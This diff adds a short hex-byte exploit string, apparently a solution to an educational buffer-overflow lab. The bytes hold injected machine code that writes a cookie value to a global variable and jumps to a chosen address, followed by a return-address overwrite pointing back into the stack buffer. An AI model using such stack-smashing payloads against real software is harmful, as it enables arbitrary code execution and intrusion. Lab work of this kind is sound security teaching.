@@ -1,0 +1,13 @@
+/* getbuf() return address :0x556830e4  */
+/* local bffer start at :0x556830b8 */
+/* padding required: 44 byte */
+b8 02 9a 3a 58  /* mov $0x583a9a02, %eax */
+a3 18 c2 04 08  /* mov %eax, 0x804c218 */ 
+68 05 8d 04 08	/* push 0x8048d05 */
+c3	/* ret */ 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+/* my function located at :0x556830b8 */
+b8 30 68 55
+
+
